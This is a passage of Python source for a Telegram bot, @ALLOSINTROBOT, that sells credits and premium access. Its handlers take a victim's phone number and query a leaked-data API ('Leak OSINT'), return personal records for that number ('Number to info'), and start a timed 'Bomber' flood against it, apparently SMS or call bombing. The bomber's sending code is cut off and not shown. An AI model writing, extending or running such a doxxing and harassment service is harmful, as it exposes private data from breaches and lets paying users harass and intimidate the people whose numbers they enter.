        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_BOT}\">🤖</tg-emoji> ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_GIVE_STAR}\">🌟</tg-emoji>\n"
        f"</blockquote>"
    )
    await msg.answer(group_msg, parse_mode=PM)

@dp.message(Command("givepremium"))
async def cmd_give_premium(msg: Message):
    if not await check_force_joined_and_respond(msg):
        return
    
    if not is_owner(msg.from_user.id):
        await msg.answer(bq("❌ ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs!"), parse_mode=PM)
        return
    
    if not msg.reply_to_message:
        await msg.answer(bq("❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ ᴛᴏ ɢɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ!"), parse_mode=PM)
        return
    
    target = msg.reply_to_message.from_user.id
    if is_owner(target):
        await msg.answer(bq("❌ ᴏᴡɴᴇʀ ɪs ᴀʟʀᴇᴀᴅʏ ᴜɴʟɪᴍɪᴛᴇᴅ!"), parse_mode=PM)
        return
    
    args = msg.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await msg.answer(bq("❌ ᴜsᴀɢᴇ: /givepremium <ᴅᴀʏs> (ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ)"), parse_mode=PM)
        return
    
    days = int(args[1])
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        return
    
    set_premium(target, days)
    until = datetime.fromtimestamp(u['premium_until'] + (days * 86400)).strftime("%d %b %Y")
    
    group_msg = bq(
        f"⭐ ᴘʀᴇᴍɪᴜᴍ ᴀᴅᴅᴇᴅ!\n"
        f"──────────────────\n"
        f"👤 ᴜsᴇʀ: {u['full_name']}\n"
        f"📅 ᴅᴀʏs: {days}\n"
        f"📆 ᴠᴀʟɪᴅ ᴜɴᴛɪʟ: {until}"
    )
    await msg.answer(group_msg, parse_mode=PM)

@dp.message(Command("takepremium"))
async def cmd_take_premium(msg: Message):
    if not await check_force_joined_and_respond(msg):
        return
    
    if not is_owner(msg.from_user.id):
        await msg.answer(bq("❌ ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs!"), parse_mode=PM)
        return
    
    if not msg.reply_to_message:
        await msg.answer(bq("❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ ᴛᴏ ʀᴇᴍᴏᴠᴇ ᴘʀᴇᴍɪᴜᴍ!"), parse_mode=PM)
        return
    
    target = msg.reply_to_message.from_user.id
    if is_owner(target):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ғʀᴏᴍ ᴏᴡɴᴇʀ!"), parse_mode=PM)
        return
    
    args = msg.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await msg.answer(bq("❌ ᴜsᴀɢᴇ: /takepremium <ᴅᴀʏs> (ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ)"), parse_mode=PM)
        return
    
    days = int(args[1])
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        return
    
    if not is_premium(target):
        await msg.answer(bq("❌ ᴜsᴇʀ ɪs ɴᴏᴛ ᴘʀᴇᴍɪᴜᴍ!"), parse_mode=PM)
        return
    
    new_until = u['premium_until'] - (days * 86400)
    if new_until <= int(time.time()):
        remove_premium(target)
        status = "ʀᴇᴍᴏᴠᴇᴅ ᴄᴏᴍᴘʟᴇᴛᴇʟʏ"
    else:
        cur.execute("UPDATE users SET premium_until=? WHERE user_id=?", (new_until, target))
        conn.commit()
        status = f"ɴᴇᴡ ᴇɴᴅ ᴅᴀᴛᴇ: {datetime.fromtimestamp(new_until).strftime('%d %b %Y')}"
    
    group_msg = bq(
        f"🚫 ᴘʀᴇᴍɪᴜᴍ ʀᴇᴍᴏᴠᴇᴅ!\n"
        f"──────────────────\n"
        f"👤 ᴜsᴇʀ: {u['full_name']}\n"
        f"📅 ᴅᴀʏs: {days}\n"
        f"📌 sᴛᴀᴛᴜs: {status}"
    )
    await msg.answer(group_msg, parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   REDEEM CODE HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(Command("redeem"))
async def cmd_redeem(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    TICKET = "<tg-emoji emoji-id=\"5418010521309815154\">🎫</tg-emoji>"
    HEART = "<tg-emoji emoji-id=\"5278686562526184461\">🤍</tg-emoji>"
    LINE = "<tg-emoji emoji-id=\"5467641505525016018\">➿</tg-emoji>"
    DIAMOND = "<tg-emoji emoji-id=\"6026218958900695642\">💎</tg-emoji>"
    CIG = "<tg-emoji emoji-id=\"5282800338036873327\">🚬</tg-emoji>"
    MONEY = "<tg-emoji emoji-id=\"6082321071556532762\">💸</tg-emoji>"
    BOT = "<tg-emoji emoji-id=\"5355051922862653659\">🤖</tg-emoji>"
    STAR = "<tg-emoji emoji-id=\"6118385795976930086\">🌟</tg-emoji>"

    line = LINE * 10
    line_big = LINE * 12

    redeem_txt = (
        f"<blockquote>"
    f"{TICKET} <b>𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘</b> {HEART}\n"
        f"{line}\n"
        f"{DIAMOND} sᴇɴᴅ ʏᴏᴜʀ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ :-\n\n"
        f"{CIG} Exᴀᴍᴘʟᴇ :- OSINT-H1FH0S\n\n"
        f"{MONEY} Pʀᴇᴍɪᴜᴍ ᴄᴏᴅᴇ :- PREMIUM-XXXXX\n"
        f"{line_big}\n"
        f"{BOT} Pᴏᴡᴇʀᴇᴅ Bʏ : @ALLOSINTROBOT {STAR}\n"
        f"</blockquote>"
    )
    await msg.answer(redeem_txt, parse_mode=PM)
    await state.set_state(RedeemState.waiting_code)
@dp.message(RedeemState.waiting_code, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_redeem_code(msg: Message, state: FSMContext):
    if not msg.text:
        return
    code = msg.text.strip().upper()
    
    if not code.startswith("OSINT-") or len(code) != 12:
        await state.clear()
        return
    
    suffix = code[6:]
    if len(suffix) != 6 or not all(c.isalnum() for c in suffix):
        await state.clear()
        return
    
    code_data = get_redeem_code(code)
    if not code_data:
        await msg.answer(
            bq("❌ ɪɴᴠᴀʟɪᴅ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ! ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ."),
            parse_mode=PM
        )
        await state.clear()
        return
    
    result = use_redeem_code(code, msg.from_user.id)
    
    if result["success"]:
        u = get_user(msg.from_user.id)
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"6071022434234930063\">✅</tg-emoji> {result['message']}!\n\n"
            f"<tg-emoji emoji-id=\"6098204676660928162\">💳</tg-emoji> ɴᴇᴡ ʙᴀʟᴀɴᴄᴇ: {u['credits']} ᴄʀᴇᴅɪᴛs"
            f"</blockquote>",
            parse_mode=PM
        )
    else:
        await msg.answer(
            bq(f"❌ {result['message']}"),
            parse_mode=PM
        )
    
    await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   LEAK OSINT HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(F.text == BTN_LEAK)
async def rk_leak(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < LEAK_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        return
    
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_ORANGE_LINE_PREMIUM}\">➿</tg-emoji>" * 7
    
    txt = (
        f"<blockquote>"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_LEAK_PREMIUM}\">🥷</tg-emoji> <b>ʟᴇᴀᴋ ᴏsɪɴᴛ</b>\n"
        f"{orange_line}\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_MOBILE_PREMIUM}\">📲</tg-emoji> 12-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BELL_PREMIUM}\">🔔</tg-emoji> Exᴀᴍᴘʟᴇ:- +919876543210\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BRICK_PREMIUM}\">🧱</tg-emoji> Tᴏᴛᴀʟ :- {'♾️' if is_owner(uid) or is_premium(uid) else u['credits']} Cʀᴇᴅɪᴛ\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIFT_PREMIUM}\">🎁</tg-emoji> Pᴇʀ-Usᴇ :- {'FREE' if is_owner(uid) or is_premium(uid) else LEAK_COST} Cʀᴇᴅɪᴛs\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOT_PREMIUM}\">🤖</tg-emoji> Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_STAR_PREMIUM}\">🌟</tg-emoji>\n"
        f"{orange_line}\n"
        f"</blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "leak", txt)
    await state.set_state(LeakState.waiting_number)

@dp.message(LeakState.waiting_number, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_leak_number(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    uid = msg.from_user.id
    number = msg.text.strip()
    
    if not number.startswith("+91") and not number.startswith("91"):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ! ᴘʟᴇᴀsᴇ ᴜsᴇ ғᴏʀᴍᴀᴛ: +919876543210"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    clean_number = number.replace("+", "")
    if not clean_number.isdigit() or len(clean_number) != 12:
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ 12-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ +91 ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ."
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    if is_number_secured(clean_number):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        await state.clear()
        return
    
    u = get_user(uid)
    if not u:
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < LEAK_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        await state.clear()
        return
    
    await log_search(uid, msg.from_user.username or "", clean_number)
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> ᴘʀᴏᴄᴇssɪɴɢ..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    credits_deducted = False
    
    try:
        url = f"{LEAK_API_URL}?key={LEAK_API_KEY}&number={clean_number}"
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            data = await resp.json(content_type=None)
        
        await proc.delete()
        
        if data.get("success") and data.get("data", {}).get("status"):
            if not is_owner(uid) and not is_premium(uid):
                deduct_credits(uid, LEAK_COST)
                credits_deducted = True
            await msg.answer(
                format_leak_response(data, clean_number),
                parse_mode=PM
            )
        else:
            await msg.answer(
                bq("❌ ɴᴏ ʟᴇᴀᴋ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ғᴏʀ ᴛʜɪs ɴᴜᴍʙᴇʀ. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."),
                parse_mode=PM
            )
            
    except Exception as e:
        await proc.delete()
        await msg.answer(
            bq(f"❌ ᴇʀʀᴏʀ: {str(e)[:100]}. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."),
            parse_mode=PM
        )
    
    u2 = get_user(uid)
    if is_owner(uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else str(u2['credits'])
    
    if credits_deducted:
        await answer_with_main(
            msg,
            bq(f"💳 ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs: {credits_display}"),
            parse_mode=PM,
        )
    await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   REPLY KEYBOARD HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(F.text == BTN_GET_INFO)
async def rk_get_info(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < GET_INFO_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        return
    
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_ORANGE_LINE_PREMIUM}\">➿</tg-emoji>" * 7
    
    txt = (
        f"<blockquote>"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PHONE}\">📞</tg-emoji> <b>ɴᴜᴍʙᴇʀ ᴛᴏ ɪɴғᴏ</b>\n"
        f"{orange_line}\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_MOBILE_PREMIUM}\">📲</tg-emoji> 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BELL_PREMIUM}\">🔔</tg-emoji> Exᴀᴍᴘʟᴇ:- 9876543210\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BRICK_PREMIUM}\">🧱</tg-emoji> Tᴏᴛᴀʟ :- {'♾️' if is_owner(uid) or is_premium(uid) else u['credits']} Cʀᴇᴅɪᴛ\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIFT_PREMIUM}\">🎁</tg-emoji> Pᴇʀ-Usᴇ :- {'FREE' if is_owner(uid) or is_premium(uid) else GET_INFO_COST} Cʀᴇᴅɪᴛ\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOT_PREMIUM}\">🤖</tg-emoji> Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_STAR_PREMIUM}\">🌟</tg-emoji>\n"
        f"{orange_line}\n"
        f"</blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "get_info", txt)
    await state.set_state(GetInfoState.waiting_number)

@dp.message(GetInfoState.waiting_number, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_get_info_number(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    uid = msg.from_user.id
    number = msg.text.strip()
    if not number.isdigit() or len(number) != 10:
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ 10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ."
            f"</blockquote>",
            parse_mode=PM
        )
        return

    if is_number_secured(number):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        await state.clear()
        return

    u = get_user(uid)
    if not u:
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < GET_INFO_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        await state.clear()
        return
    
    await log_search(uid, msg.from_user.username or "", number)
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> ᴘʀᴏᴄᴇssɪɴɢ..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    credits_deducted = False

    try:
        url = f"{GET_INFO_API}?number={number}&key={GET_INFO_KEY}"
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
            data = await resp.json(content_type=None)

        await proc.delete()

        if data.get("success") and data.get("found"):
            if not is_owner(uid) and not is_premium(uid):
                deduct_credits(uid, GET_INFO_COST)
                credits_deducted = True
            await msg.answer(format_info(data, number), parse_mode=PM)
        else:
            await msg.answer(bq("❌ ɴᴏ ʀᴇᴄᴏʀᴅ ғᴏᴜɴᴅ. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."), parse_mode=PM)

    except Exception as e:
        await proc.delete()
        await msg.answer(bq(f"❌ ᴇʀʀᴏʀ: {str(e)[:100]}. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."), parse_mode=PM)

    u2 = get_user(uid)
    if is_owner(uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else str(u2['credits'])
    
    if credits_deducted:
        await answer_with_main(
            msg,
            bq(f"💳 ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs: {credits_display}"),
            parse_mode=PM,
        )
    await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   My Profile
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message(F.text == BTN_MY_PROFILE)
async def rk_profile(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    joined = datetime.fromtimestamp(u["joined_at"]).strftime("%d %b %Y") if u["joined_at"] else "N/A"
    
    if is_owner(uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
        premium_status = "👑 ᴏᴡɴᴇʀ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else str(u['credits'])
        premium_status = "⭐ ᴘʀᴇᴍɪᴜᴍ" if is_premium(uid) else "🆓 ғʀᴇᴇ"
        if u['premium_until'] > 0:
            days_left = (u['premium_until'] - int(time.time())) // 86400
            premium_status += f" ({days_left} ᴅᴀʏs)"
    
    txt = (
        f"<blockquote>👤 ᴍʏ ᴘʀᴏғɪʟᴇ\n"
        f"──────────────────\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_NAME}\">🪪</tg-emoji> ɴᴀᴍᴇ: {u['full_name']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_ID}\">🆔</tg-emoji> ɪᴅ: {u['user_id']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_USERNAME}\">📛</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ: @{u['username'] or 'N/A'}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_CREDITS}\">💳</tg-emoji> ᴄʀᴇᴅɪᴛs: {credits_display}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_STATUS}\">⭐</tg-emoji> sᴛᴀᴛᴜs: {premium_status}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_REFERRALS}\">🔥</tg-emoji> ʀᴇғᴇʀʀᴀʟs: {u['refer_count']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_PROFILE_JOINED}\">📅</tg-emoji> ᴊᴏɪɴᴇᴅ: {joined}\n"
        f"──────────────────</blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "profile", txt, main_kb(), parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   Refer & Earn
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message(F.text == BTN_REFER)
async def rk_refer(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={uid}"
    
    txt = (
        f"<blockquote><tg-emoji emoji-id=\"{EMOJI_REFER_HEADER}\">🔵</tg-emoji> ʀᴇғᴇʀ & ᴇᴀʀɴ\n"
        f"──────────────────\n"
        f"<tg-emoji emoji-id=\"{EMOJI_REFER_EARN}\">💰</tg-emoji> ᴇᴀʀɴ {REFER_CREDITS} ᴄʀᴇᴅɪᴛ ᴘᴇʀ ʀᴇғᴇʀʀᴀʟ!\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_REFER_COUNT}\">🔥</tg-emoji> ʀᴇғᴇʀʀᴀʟs: {u['refer_count']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_REFER_CREDITS}\">💳</tg-emoji> ᴄʀᴇᴅɪᴛs: {u['credits']}\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_REFER_LINK}\">🔗</tg-emoji> ʏᴏᴜʀ ʟɪɴᴋ:\n"
        f"<code>{link}</code></blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "refer", txt, refer_kb(link), parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   Daily Spin
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message(F.text == BTN_SPIN)
async def rk_spin(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if is_owner(uid) or is_premium(uid):
        await msg.answer(bq("⭐ ᴏᴡɴᴇʀ/ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴅᴏɴ'ᴛ ɴᴇᴇᴅ ᴛᴏ sᴘɪɴ ғᴏʀ ᴄʀᴇᴅɪᴛs!"), parse_mode=PM)
        return
    
    now = int(time.time())
    last = u["last_spin"]
    cooldown = 86400

    if now - last < cooldown:
        remaining = cooldown - (now - last)
        hrs = remaining // 3600
        mins = (remaining % 3600) // 60
        await msg.answer(bq(f"⏳ ᴄᴏᴏʟᴅᴏᴡɴ ɪɴ {hrs}h {mins}m!"), parse_mode=PM)
        return

    dice_msg = await bot.send_dice(msg.chat.id)
    value = dice_msg.dice.value
    await asyncio.sleep(4)

    add_credits(uid, value)
    set_last_spin(uid, now)
    u2 = get_user(uid)

    # Premium emoji IDs
    LINE = "<tg-emoji emoji-id=\"5467641505525016018\">➿</tg-emoji>"
    DOWN = "<tg-emoji emoji-id=\"6339166816006312740\">👇</tg-emoji>"
    TARGET = "<tg-emoji emoji-id=\"6109432142079466939\">🎯</tg-emoji>"
    MONEY1 = "<tg-emoji emoji-id=\"6267068789146260253\">💰</tg-emoji>"
    MONEY2 = "<tg-emoji emoji-id=\"5258204546391351475\">💰</tg-emoji>"
    HOURGLASS = "<tg-emoji emoji-id=\"5386367538735104399\">⌛</tg-emoji>"
    BOT = "<tg-emoji emoji-id=\"5355051922862653659\">🤖</tg-emoji>"
    STAR = "<tg-emoji emoji-id=\"6118385795976930086\">🌟</tg-emoji>"

    line = LINE * 12
    line_small = LINE * 11
    line_footer = LINE * 10

    txt = (
        f"<blockquote>"
        f"ᴅᴀɪʟʏ sᴘɪɴ ʀᴇsᴜʟᴛ {DOWN}\n\n"
        f"{line}\n"
        f"{TARGET} ʏᴏᴜ ʀᴏʟʟᴇᴅ: {value}\n"
        f"{MONEY1} ᴇᴀʀɴᴇᴅ: +{value}\n"
        f"{MONEY2} ᴛᴏᴛᴀʟ: {u2['credits']}\n"
        f"{line}\n"
        f"{HOURGLASS} ᴄᴏᴏʟᴅᴏᴡɴ ɪɴ 24 ʜᴏᴜʀs!\n\n"
        f"{line_footer}\n"
        f"{BOT} Pᴏᴡᴇʀᴇᴅ Bʏ : @ALLOSINTROBOT {STAR}\n"
        f"</blockquote>"
    )
    await answer_with_main(msg, txt, parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   BOMBER HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message(F.text == BTN_BOMBER)
async def rk_blast(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        return
    
    await state.clear()
    
    uid = msg.from_user.id
    u = get_user(uid)
    if not u:
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < BLAST_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        return
    
    txt = (
        f"<blockquote><tg-emoji emoji-id=\"{EMOJI_BOMBER_HEADER}\">💥</tg-emoji> ʙᴏᴍʙᴇʀ\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOMBER_CREDITS}\">💳</tg-emoji> ᴄʀᴇᴅɪᴛs: {'♾️' if is_owner(uid) or is_premium(uid) else u['credits']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOMBER_COST}\">💸</tg-emoji> ᴄᴏsᴛ: {'FREE' if is_owner(uid) or is_premium(uid) else BLAST_COST}\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_BOMBER_SEND}\">📨</tg-emoji> sᴇɴᴅ ᴍᴇ ᴛʜᴇ ɴᴜᴍʙᴇʀ (10-digit):</blockquote>"
    )
    await send_dashboard_media(bot, msg.chat.id, "blast", txt, parse_mode=PM)
    await state.set_state(BlastState.waiting_number)

@dp.message(BlastState.waiting_number, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_blast_number(msg: Message, state: FSMContext):
    if not await check_force_joined_and_respond(msg):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    uid = msg.from_user.id
    number = msg.text.strip()
    if not number.isdigit() or len(number) != 10:
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> ɪɴᴠᴀʟɪᴅ! sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ 10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ."
            f"</blockquote>",
            parse_mode=PM
        )
        return

    if is_number_secured(number):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        await state.clear()
        return

    u = get_user(uid)
    if not u:
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid) and u["credits"] < BLAST_COST:
        await msg.answer(bq("❌ ɪɴsᴜғғɪᴄɪᴇɴᴛ ʙᴀʟᴀɴᴄᴇ!"), parse_mode=PM)
        await state.clear()
        return
    
    if not is_owner(uid) and not is_premium(uid):
        deduct_credits(uid, BLAST_COST)
    
    await log_search(uid, msg.from_user.username or "", number)
    await state.clear()

    if is_owner(uid) or is_premium(uid):
        duration = BOMBER_DURATION_PREMIUM
        duration_text = "1 ʜᴏᴜʀ"
    else:
        duration = BOMBER_DURATION_NORMAL
        duration_text = "10 ᴍɪɴ"

    status_msg = await msg.answer(
        f"<blockquote><tg-emoji emoji-id=\"{EMOJI_BLAST_HEADER}\">💥</tg-emoji> ʙᴏᴍʙᴇʀ sᴛᴀʀᴛᴇᴅ!\n"
        f"──────────────────\n"
